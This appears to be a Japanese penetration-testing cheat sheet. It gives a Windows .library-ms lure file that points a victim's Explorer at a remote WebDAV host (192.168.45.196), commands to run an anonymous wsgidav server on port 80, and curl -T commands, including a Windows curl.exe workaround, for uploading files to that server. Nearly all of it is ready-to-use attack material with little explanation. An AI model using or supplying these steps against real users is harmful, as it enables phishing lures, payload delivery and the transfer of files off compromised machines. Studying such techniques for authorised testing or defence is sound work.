### config.library-ms
テスト端末等で開くと、`<url>`タグ内がシリアライズされて別端末や再起動後の同一端末において機能しなくなることがあるため注意！！

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.196</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

```sh
# webdavサーバ起動
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ./webdav

# webdavサーバにファイルアップロード
curl -T FILEPATH http://SERVERIP/

# Windowsだとcurlエイリアスと認識されてInvoke-WebRequestが実行されることがある。
# Invoke-WebRequestには-Tオプションはないのでエラーが出る。
# 回避のためにしっかりcurlバイナリを指定する必要がある。
curl.exe -T FILEPATH http://SERVERIP/
C:\Windows\System32\curl.exe -T FILEPATH http://SERVERIP/
```